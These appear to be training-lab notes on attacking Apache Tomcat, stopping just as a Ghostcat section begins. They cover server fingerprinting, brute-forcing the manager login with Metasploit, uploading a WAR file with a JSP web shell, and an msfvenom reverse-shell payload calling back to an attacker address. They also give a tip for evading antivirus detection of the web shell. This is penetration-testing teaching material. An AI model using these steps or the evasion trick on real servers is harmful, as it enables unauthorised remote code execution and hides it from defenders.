

    Apache Tomcat is an open-source web server that hosts applications written in Java. Tomcat was initially designed to run Java Servlets and Java Server Pages (JSP) scripts. However, its popularity increased in Java-based frameworks and is now widely used by frameworks such as Spring and tools such as Gradle. 


            --Discovery/Footprinting

    

    Tomcat servers can be identified by the Server header in the HTTP response. If the server is operating behind a reverse proxy, requesting an invalid page should reveal the server and version.

    Custom error pages may be in use that do not leak this version information. In this case, 
    another method of detecting a Tomcat server and version is through the /docs page.

    
    $ curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat 

    This is the default documentation page, which may not be removed by administrators. Here is the general folder structure of a Tomcat installation.

        ├── bin
        ├── conf
        │   ├── catalina.policy
        │   ├── catalina.properties
        │   ├── context.xml
        │   ├── tomcat-users.xml
        │   ├── tomcat-users.xsd
        │   └── web.xml
        ├── lib
        ├── logs
        ├── temp
        ├── webapps
        │   ├── manager
        │   │   ├── images
        │   │   ├── META-INF
        │   │   └── WEB-INF
        |   |       └── web.xml
        │   └── ROOT
        │       └── WEB-INF
        └── work
        └── Catalina
                └── localhost





     The bin folder stores scripts and binaries needed to start and run a Tomcat server. The conf folder stores various configuration files used by Tomcat. The tomcat-users.xml file stores user credentials and their assigned roles. The lib folder holds the various JAR files needed for the correct functioning of Tomcat. The logs and temp folders store temporary log files. The webapps folder is the default webroot of Tomcat and hosts all the applications. The work folder acts as a cache and is used to store data during runtime.

     Each folder inside webapps is expected to have the following structure.


        webapps/customapp
        ├── images
        ├── index.jsp
        ├── META-INF
        │   └── context.xml
        ├── status.xsd
        └── WEB-INF
        ├── jsp
        |   └── admin.jsp
        └── web.xml
        └── lib
        |    └── jdbc_drivers.jar
        └── classes
             └── AdminServlet.class


        
        The most important file among these is WEB-INF/web.xml, which is known as the deployment descriptor. This file stores information about the routes used by the application and the classes handling these routes. All compiled classes used by the application should be stored in the WEB-INF/classes folder. These classes might contain important business logic as well as sensitive information. Any vulnerability in these files can lead to total compromise of the website. The lib folder stores the libraries needed by that particular application. The jsp folder stores Jakarta Server Pages (JSP), formerly known as JavaServer Pages, which can be compared to PHP files on an Apache server.

        Here’s an example web.xml file.

        <?xml version="1.0" encoding="ISO-8859-1"?>

        <!DOCTYPE web-app PUBLIC "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN" "http://java.sun.com/dtd/web-app_2_3.dtd">

        <web-app>
                <servlet>
                        <servlet-name>AdminServlet</servlet-name>
                        <servlet-class>com.inlanefreight.api.AdminServlet</servlet-class>
                </servlet>

                <servlet-mapping>
                        <servlet-name>AdminServlet</servlet-name>
                        <url-pattern>/admin</url-pattern>
                </servlet-mapping>
        </web-app>   

        The web.xml configuration above defines a new servlet named AdminServlet that is mapped to the class com.inlanefreight.api.AdminServlet. Java uses the dot notation to create package names, meaning the path on disk for the class defined above would be:

        classes/com/inlanefreight/api/AdminServlet.class


        Next, a new servlet mapping is created to map requests to /admin with AdminServlet. This configuration will send any request received for /admin to the AdminServlet.class class for processing. The web.xml descriptor holds a lot of sensitive information and is an important file to check when leveraging a Local File Inclusion (LFI) vulnerability.

        The tomcat-users.xml file is used to allow or disallow access to the /manager and host-manager admin pages.



                --Enumeration

        
        After fingerprinting the Tomcat instance, unless it has a known vulnerability, we'll typically want to look for the /manager and the /host-manager pages. We can attempt to locate these with a tool such as Gobuster or just browse directly to them.

        We may be able to either log in to one of these using weak credentials such as tomcat:tomcat, admin:admin, etc. If these first few tries don't work, we can try a password brute force attack against the login page, covered in the next section. If we are successful in logging in, we can upload a Web Application Resource or Web Application ARchive (WAR) file containing a JSP web shell and obtain remote code execution on the Tomcat server.




                ---Tomcat Manager - Login Brute Force

         We can use the auxiliary/scanner/http/tomcat_mgr_login Metasploit module for these purposes, Burp Suite Intruder or any number of scripts to achieve this. We'll use Metasploit for our purposes.

         s. Again, we must specify the vhost and the target's IP address to interact with the target properly. We should also set STOP_ON_SUCCESS to true so the scanner stops when we get a successful login, no use in generating loads of additional requests after a successful login.

         msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local
        msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
        msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
        msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58


        Let's say a particular Metasploit module (or another tool) is failing or not behaving the way we believe it should. We can always use Burp Suite or ZAP to proxy the traffic and troubleshoot. To do this, first, fire up Burp Suite and then set the PROXIES option like the following:

        msf6 auxiliary(scanner/http/tomcat_mgr_login) > set PROXIES HTTP:127.0.0.1:8080



                ---Tomcat Manager - WAR File Upload


        Many Tomcat installations provide a GUI interface to manage the application. This interface is available at /manager/html by default, which only users assigned the manager-gui role are allowed to access. Valid manager credentials can be used to upload a packaged Tomcat application (.WAR file) and compromise the application. A WAR, or Web Application Archive, is used to quickly deploy web applications and backup storage.


        The manager web app allows us to instantly deploy new applications by uploading WAR files. A WAR file can be created using the zip utility. A JSP web shell such as this can be downloaded and placed within the archive.
        (   https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp)


        $ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
        
        $ zip -r backup.war cmd.jsp 

        Click on Browse to select the .war file and then click on Deploy.

        This file is uploaded to the manager GUI, after which the /backup application will be added to the table.

        If we click on backup, we will get redirected to http://web01.inlanefreight.local:8180/backup/ and get a 404 Not Found error. We need to specify the cmd.jsp file in the URL as well. Browsing to http://web01.inlanefreight.local:8180/backup/cmd.jsp will present us with a web shell that we can use to run commands on the Tomcat server. From here, we could upgrade our web shell to an interactive reverse shell and continue. Like previous examples, we can interact with this web shell via the browser or using cURL on the command line.

        $ curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id


        We could also use msfvenom to generate a malicious WAR file. The payload java/jsp_shell_reverse_tcp will execute a reverse shell through a JSP file. Browse to the Tomcat console and deploy this file. Tomcat automatically extracts the WAR file contents and deploys it.


        $ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war

        Start a Netcat listener and click on /backup to execute the shell.

        The multi/http/tomcat_mgr_upload Metasploit module can be used to automate the process shown above


        This (  https://github.com/SecurityRiskAdvisors/cmd.jsp ) JSP web shell is very lightweight (under 1kb) and utilizes a Bookmarklet or browser bookmark to execute the JavaScript needed for the functionality of the web shell and user interface. Without it, browsing to an uploaded cmd.jsp would render nothing. This is an excellent option to minimize our footprint and possibly evade detections for standard JSP web shells (though the JSP code may need to be modified a bit).


        A simple change such as changing:
        

        FileOutputStream(f);stream.write(m);o="Uploaded:

        to:
        

        FileOutputStream(f);stream.write(m);o="uPlOaDeD:

        results in 0/58 security vendors flagging the cmd.jsp file as malicious at the time of writing.





                ---CVE-2020-1938 : Ghostcat
        

        AJP stands for Apache Jserv Protocol, which is a binary protocol used to proxy requests. This is typically used in proxying requests to application servers behind the front-end web servers.

        The AJP service is usually running at port 8009 on a Tomcat server. This can be checked with a targeted Nmap scan.

        $ nmap -sV -p 8009,8080 app-dev.inlanefreight.local

        